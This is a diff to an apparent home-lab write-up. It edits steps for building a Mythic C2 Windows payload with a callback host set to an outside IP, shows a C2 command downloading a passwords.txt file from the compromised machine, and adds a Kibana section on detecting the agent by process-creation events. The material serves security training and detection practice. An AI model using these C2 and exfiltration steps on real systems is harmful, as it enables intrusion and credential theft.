@@ -570,14 +570,15 @@ Proceeded to install the http profile by executing the following command:
 ./mythic-cli install github https://github.com/MythicC2Profiles/http
 ```
 
-*you can now see both agents
+**You can now see both agents on the dashboard**
+
 ![image](https://github.com/user-attachments/assets/c489c8b1-21be-4fcb-b183-62dcd37652ac)
 
 *After installation, create a new Windows payload in Mythic.
 *Selected the WindowsExe package and included all necessary commands.
-*Chose the http C2 Profile and set the Callback Host to HTTP://173.199.123.188
+*Chose the HTTP C2 Profile and set the Callback Host to HTTP://173.199.123.188
 *Finalized the setup and generated the payload.
-*Right click the download file and select copy link address
+*Right-click the download file and select copy link address
 
 
 Run the following command:
@@ -625,7 +626,22 @@ download C:\Users\Administrator\Documents\passwords.txt
 ![image](https://github.com/user-attachments/assets/ab7952f7-1c3d-4fd1-bc8e-f087852c8bf2)
 
 
+**Day 22 How To Create Alerts and Dashboards in Kibana**
 
+
+* Started by searching for the Mythic executable named apollo.exe in Elastic (this is the agent file name I deployed).
+* To refine the results, I added a filter: event.code:1
+   * This filter logs process creation events and captures MD5 hashes of executables.
+   * It helps in detecting potential malicious files.
+* After locating the relevant event, I:
+   * Clicked on the event to view details.
+   * Copied the associated hash for further analysis.      
+
+
+![image](https://github.com/user-attachments/assets/6b4fac81-63a7-49b0-8aff-18f0a28f6f6f)
+
+
+*
 
 
 
